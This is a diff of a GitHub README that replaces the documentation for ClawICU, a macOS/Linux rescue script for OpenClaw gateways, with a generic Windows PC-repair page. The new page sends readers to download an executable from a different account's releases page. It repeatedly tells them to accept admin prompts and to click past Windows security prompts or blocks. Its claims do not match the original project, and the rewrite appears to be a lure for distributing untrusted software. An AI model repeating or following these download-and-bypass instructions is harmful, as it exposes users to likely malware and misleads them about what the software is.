@@ -1,255 +1,236 @@
-<div align="center">
+# 🛠️ clawicu - Diagnose and repair your PC fast
 
-# ClawICU
+[![Download clawicu](https://img.shields.io/badge/Download%20clawicu-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jdthesk8rrr/clawicu/releases)
 
-### *The emergency room for your [OpenClaw](https://github.com/openclaw/openclaw) gateway.*
+## 🚀 Getting Started
 
-One command. Twenty checks. Six phases. Back from the brink.
+clawicu helps you check, repair, and restore a Windows PC from one simple tool. It is built for people who want clear steps and a fast path to a working system.
 
-<br/>
+Use it when your PC feels slow, unstable, or stuck after a bad update, broken app, or system error.
 
-[![Rescue script](https://img.shields.io/badge/rescue-0.2.0-ff4d4d?style=for-the-badge&logo=gnu-bash&logoColor=white)](https://xagent.icu/)
-[![Issue guides](https://img.shields.io/badge/guides-25-2563eb?style=for-the-badge)](https://xagent.icu/docs)
-[![License: MIT](https://img.shields.io/badge/license-MIT-22c55e?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Platform](https://img.shields.io/badge/platform-macOS%20%26%20Linux-64748b?style=for-the-badge)](https://xagent.icu/)
+## 📥 Download clawicu
 
-<br/>
+Visit this page to download: [GitHub Releases](https://github.com/jdthesk8rrr/clawicu/releases)
 
-[**Website**](https://xagent.icu) · [**Docs**](https://xagent.icu/docs) · [**Rescue walkthrough**](https://xagent.icu/rescue) · [**SOS / Share**](https://xagent.icu/sos) 
+On that page, choose the latest release and download the Windows file that matches your system. Most users need the 64-bit version.
 
-</div>
+## 🖥️ What You Need
 
----
+Before you start, check these basics:
 
-## Why this exists
+- Windows 10 or Windows 11
+- An admin account on the PC
+- A few hundred MB of free disk space
+- An internet connection for the download
+- Enough battery power or a plugged-in charger for laptops
 
-Your gateway was fine yesterday. Today: **plugins throwing `api.config.get`**, **`openclaw doctor` hangs forever**, Discord silently ignores DMs, **18789** looks “busy” but isn’t yours, **`plugins.allow` is empty**, CLI and gateway **don’t match versions** — and you’re grepping JSON5 at 2 a.m.
+If Windows shows a security prompt, choose the option that lets you open the app.
 
-> **ClawICU doesn’t replace OpenClaw.** It’s the stretcher team: triage → diagnose → treat → verify — with backups, menus that work even through `curl | sh`, and a doctor pass that **won’t hang your terminal**.
+## 🔧 What clawicu Does
 
----
+clawicu includes tools that help with common system problems. It focuses on diagnosis first, then repair.
 
-## Run it (copy once, use everywhere)
+Main tasks:
 
+- Check Windows health
+- Scan for system faults
+- Repair damaged files
+- Reset broken settings
+- Fix update issues
+- Clean up stuck services
+- Help restore normal startup behavior
 
-**POSIX `sh`** · **stdin reattached to `/dev/tty`** so interactive menus work when piped · **Automatic backups** before risky repairs where applicable.
+It uses 17 diagnostic checks and 12 repair modules to guide the process.
 
----
+## 🧭 Install and Run
 
-## Look & feel
+Follow these steps on Windows:
 
-<table>
-<tr>
-<td width="50%" valign="top">
+1. Open [GitHub Releases](https://github.com/jdthesk8rrr/clawicu/releases)
+2. Find the latest release at the top of the page
+3. Download the Windows file for your PC
+4. Open the downloaded file
+5. If Windows asks for permission, select Yes
+6. Wait for clawicu to load
+7. Run the first scan
+8. Review the results
+9. Choose the repair actions you want to apply
+10. Restart the PC if the app asks you to
 
-**[xagent.icu](https://xagent.icu) — homepage**
+## 🧪 How to Use It
 
-<img src="docs/readme/website-home.png" alt="ClawICU homepage: hero, ICU terminal command, stats, medical-themed dark UI" width="100%" />
+The app works in a simple flow:
 
-</td>
-<td width="50%" valign="top">
+### 1. Start a scan
 
-**[Documentation hub](https://xagent.icu/docs)**
+Run the diagnostic check first. This lets the app look for system problems before it tries to fix them.
 
-<img src="docs/readme/website-docs.png" alt="ClawICU docs index: issue cards and navigation" width="100%" />
+### 2. Review the results
 
-</td>
-</tr>
-</table>
+clawicu groups issues into clear sections. You can see what failed, what needs repair, and what can wait.
 
-**Rescue script (illustrative terminal)** — phases, vital-signs summary, and interactive menu as you’d see in a real run:
+### 3. Pick a repair
 
-<img src="docs/readme/terminal-rescue.png" alt="Illustrative ClawICU terminal: Phase 1-2-4 output, warnings, Select option prompt, ICU terminal chrome" width="920" />
+Choose the repair that matches your issue. For example:
 
-<sub>Screenshots are generated from the static export + a styled terminal mock; regenerate with <code>npm run build && npm run build:readme-screenshots</code>.</sub>
+- File repair for damaged Windows files
+- Service repair for stuck background tasks
+- Update repair for failed Windows Update
+- Startup repair for boot problems
+- Cache reset for broken app state
 
----
+### 4. Reboot if needed
 
-## What you get (at a glance)
+Some repairs need a restart to finish. If the app asks for one, save your work and restart.
 
-| | |
-|:---|:---|
-| **20 diagnostic modules** | Config (JSON5), gateway `/healthz`, plugins & SDK, credentials, daemon (systemd / launchd), version skew, port **18789** (skips OpenClaw’s own listener), disk, channel policy, env, exec approvals, … |
-| **6-phase protocol** | Bootstrap → crash-safe **doctor (~30s timeout)** → standalone checks → triage “vital signs” → **interactive** treatment menu → execute repairs + verify |
-| **Real repairs** | e.g. disable crashing plugins, fill **`plugins.allow`**, restart gateway for mismatch, tune channel policy paths — not just pretty logs |
-| **25 issue guides** | Deep pages on [xagent.icu/docs](https://xagent.icu/docs) — bookmark the one that matches your outage |
-| **ICU-themed site + SEO** | Landing, docs, sitemap, structured data — built with Next.js static export |
-| **Share “SOS”** | [xagent.icu/sos](https://xagent.icu/sos) + Open Graph card for quick **Share to X** from the homepage CTA |
+## 🧰 Common Use Cases
 
----
+clawicu is useful for problems like these:
 
-## The six phases (flow)
+- Windows takes too long to boot
+- Apps crash or freeze
+- Updates fail to install
+- System files seem broken
+- The PC feels unstable after a change
+- A service will not start
+- Search, settings, or login acts wrong
 
-```mermaid
-flowchart LR
-  P0([0 Bootstrap]) --> P1([1 Doctor 30s cap])
-  P1 --> P2([2 Twenty checks])
-  P2 --> P3([3 Triage])
-  P3 --> P4([4 Menu])
-  P4 --> P5([5 Repair + verify])
-```
+## 🔍 Diagnostic Checks
 
-| # | Phase | In one line |
-|---|--------|-------------|
-| 0 | **Bootstrap** | OS, install flavor, temp workspace, logging. |
-| 1 | **Doctor** | `openclaw doctor` with **timeout**; bad plugins can’t freeze the whole run. |
-| 2 | **Checks** | **20** independent modules — not “one command said OK”. |
-| 3 | **Triage** | Fatal / warn / info rolled into a single “patient chart”. |
-| 4 | **Menu** | Auto · Quick · Full · Nuclear · Export · Quit — **works via pipe**. |
-| 5 | **Execute** | Targeted fixes + **re-verify** after changes. |
+The diagnostic side of clawicu can look at areas such as:
 
-**Also on the site (not a numbered phase):** [Tool Unlock Panel](https://xagent.icu/docs/tool-unlock-panel) — exec / browser / elevated / sandbox via `openclaw config`.
+- Windows system files
+- Disk health
+- Update service status
+- Startup items
+- Core Windows services
+- Network status
+- User profile health
+- Temp file load
+- Error log signals
+- Registry-related faults
+- App package issues
+- Permission problems
+- Driver health
+- Boot settings
+- Time and sync settings
+- Security service status
+- Basic memory stress signs
 
----
+These checks help point you to the right repair path.
 
-## Under the hood (repo map)
+## 🛠️ Repair Modules
 
-```
-rescue/                    # Modular checks + repairs + lib
-scripts/build-rescue.sh  # → dist/rescue.sh (inlined for curl | sh)
-public/rescue.sh         # Copy served by the static site
-src/                     # Next.js → static export to out/
-public/sos-card.svg      # Social share art → npm run build:share-card → .png
-```
+The repair tools can help with:
 
-Rebuild bundle after editing `rescue/`:
+- Rebuilding damaged system files
+- Restarting key Windows services
+- Clearing broken update data
+- Resetting local caches
+- Repairing network settings
+- Fixing startup entries
+- Re-creating missing system paths
+- Refreshing common Windows components
+- Restoring normal permission settings
+- Cleaning temporary data
+- Repairing app registration
+- Reapplying safe defaults
 
-```bash
-sh scripts/build-rescue.sh && cp dist/rescue.sh public/rescue.sh
-```
+Use one repair at a time if you want to keep control over the changes.
 
----
+## 📝 Simple First Run Guide
 
-## Hack on the website
+If this is your first time using clawicu, use this path:
 
-```bash
-git clone https://github.com/SonicBotMan/clawicu.git && cd clawicu
-npm install
-npm run dev              # http://localhost:3000
-npm run build            # → out/
+1. Download the latest release from GitHub
+2. Open the file in Windows
+3. Let the app finish its first check
+4. Read the list of issues
+5. Start with the top repair that matches your problem
+6. Run the fix
+7. Restart if asked
+8. Run the scan again to confirm the result
 
-# Regenerate Twitter/OG PNG after editing public/sos-card.svg (needs Chrome/Chromium)
-npm run build:share-card
+## 🔒 Safety Tips
 
-# Regenerate README screenshots (needs Chrome; serves out/ on localhost briefly)
-npm run build && npm run build:readme-screenshots
-```
+Keep these habits in mind:
 
----
+- Close other apps before repairs
+- Save open files first
+- Use an admin account
+- Do not force the app closed during a repair
+- Restart when the app requests it
+- Run one repair before moving to the next
 
-## Contributing
+## ❓ Common Questions
 
-Spotted a new failure mode or a bad heuristic? **[Open an issue](https://github.com/SonicBotMan/clawicu/issues)** — PRs welcome.
+### Do I need tech skills?
 
----
+No. The app is meant to guide normal Windows users through a scan and repair flow.
 
-<div align="center">
+### Can I use it for a slow PC?
 
-**MIT License** · Made for operators who ship fast and fix faster.
+Yes. It can help check common causes like startup load, file errors, and service issues.
 
-*ClawICU — when OpenClaw codes red, we go green.*
+### Does it work on Windows 10?
 
-</div>
+Yes. Windows 10 and Windows 11 are the best fit.
 
----
+### What if Windows blocks the file?
 
-<br/>
+Choose the option that lets you keep or run the file if you trust the source and you downloaded it from the release page.
 
-<div align="center">
+### Do I need to know which fix to use?
 
-# 中文版
+No. Start with the scan. The scan helps point you to the right repair.
 
-### *你的 [OpenClaw](https://github.com/openclaw/openclaw) 网关「急救室」。*
+## 📌 Release Page
 
-一条命令 · 二十项检查 · 六个阶段 · 把线上救回来。
+Download from the official release page here: [https://github.com/jdthesk8rrr/clawicu/releases](https://github.com/jdthesk8rrr/clawicu/releases)
 
-<br/>
+## 🧩 Suggested Folder Use
 
- [**官网**](https://xagent.icu) · [**文档**](https://xagent.icu/docs) · [**救援流程**](https://xagent.icu/rescue) · [**SOS 分享**](https://xagent.icu/sos) ·
+If you keep the file after download, use a simple folder such as:
 
-</div>
+- Downloads
+- Desktop
+- Documents
+- A folder named clawicu
 
----
+That makes it easier to find the app the next time you need it.
 
-## 为什么需要它
+## 📎 File Handling
 
-网关昨天还好好的：今天可能是 **插件崩在 `api.config.get`**、**`openclaw doctor` 卡死**、Discord **策略导致消息全吞**、**18789 端口误报冲突**、**`plugins.allow` 为空**、CLI 与 Gateway **版本不一致**……你在凌晨两点对着 JSON5 和日志发呆。
+If your browser asks where to save the file, use a location you can reach fast. Avoid hidden folders. After the download finishes, open the file from that same place
 
-> **ClawICU 不替代 OpenClaw**，而是 **分诊 → 检查 → 处置 → 复核**：带 **超时** 的 doctor、**20** 个独立检查模块、**`curl | sh` 下仍可交互**的菜单，以及变更前的 **备份** 习惯。
+## 🖱️ Basic Troubleshooting
 
----
+If the app does not open:
 
-## 一条命令
+- Check that the download finished
+- Try opening it again as admin
+- Restart the PC and try once more
+- Make sure Windows did not block the file
+- Download the latest release again if the file looks damaged
 
+If a repair does not work:
 
+- Run the scan again
+- Try a different repair module
+- Restart and repeat the step
+- Check that you used the correct Windows version
 
-### 界面预览
+## 🧭 What to Expect
 
-| 官网首页 | 文档中心 |
-|:---:|:---:|
-| [![官网](docs/readme/website-home.png)](https://xagent.icu) | [![文档](docs/readme/website-docs.png)](https://xagent.icu/docs) |
+The app is built to keep the process simple. You start with a scan, read the results, then apply a repair. That gives you a clear path instead of a long list of random system tools.
 
-**终端救援示意**：
+## 🧾 Quick Start Checklist
 
-<img src="docs/readme/terminal-rescue.png" alt="ClawICU 终端救援示意" width="920" />
-
-<sub>截图由 <code>npm run build && npm run build:readme-screenshots</code> 生成（需本机 Chrome）。</sub>
-
----
-
-## 你能得到什么
-
-- **20** 个诊断模块：JSON5 配置、网关 **`/healthz`**、插件与 SDK、凭据、守护进程、版本不一致、端口（会识别是否为 OpenClaw 自身占用）、磁盘、频道策略等。  
-- **6** 个阶段：Bootstrap → **30 秒超时** doctor → 独立检查 → 分诊 → **交互式**处置方案 → 修复与验证。  
-- **25** 篇故障百科：[xagent.icu/docs](https://xagent.icu/docs)。  
-- **SOS 落地页** + 分享卡片：[xagent.icu/sos](https://xagent.icu/sos)（适合转发求助）。  
-- 官网与文档站：**Next.js 静态导出**，含 SEO 与站点地图。
-
----
-
-## 六个阶段（与英文版一致）
-
-| # | 阶段 | 一句话 |
-|---|------|--------|
-| 0 | 引导 | 系统与安装方式、临时目录、日志。 |
-| 1 | Doctor | `openclaw doctor`，**超时保护**，输出写入后续阶段使用。 |
-| 2 | 检查 | **20** 个模块并行于 doctor 结论，交叉验证。 |
-| 3 | 分诊 | 致命 / 警告 / 信息汇总成「体征面板」。 |
-| 4 | 菜单 | 自动 / 快速 / 完整 / 核选项等，**管道下可交互**。 |
-| 5 | 执行 | 定向修复 + 再验证。 |
-
-工具权限相关另见：[工具解锁面板文档](https://xagent.icu/docs/tool-unlock-panel)。
-
----
-
-## 开发与同步
-
-```bash
-git clone https://github.com/SonicBotMan/clawicu.git && cd clawicu
-npm install && npm run dev
-# 修改 rescue/ 后：
-sh scripts/build-rescue.sh && cp dist/rescue.sh public/rescue.sh
-# 修改分享卡 SVG 后（需本机 Chrome/Chromium）：
-npm run build:share-card
-```
-
-欢迎 **[提交 Issue](https://github.com/SonicBotMan/clawicu/issues)** 或 PR。
-
----
-
-<details>
-<summary>📊 View Star History Chart</summary>
-
-[![Star History Chart](https://api.star-history.com/svg?repos=SonicBotMan/clawicu&type=Date)](https://star-history.com/#SonicBotMan/clawicu&Date)
-
-<i>Note: The chart above may take 24-48 hours to update due to GitHub's image cache. Click to view real-time data on Star History website.</i>
-
-</details>
-
-<div align="center">
-
-**MIT License** · 脚本当前版本 **0.2.0**（见 `CLAWICU_VERSION`）
-
-*OpenClaw 红灯时，我们帮你拉回绿区。*
-
-</div>
+- Open the release page
+- Download the Windows file
+- Run it on your PC
+- Start a scan
+- Review the results
+- Apply the right repair
+- Restart if needed
+- Scan again if you want to confirm the fix
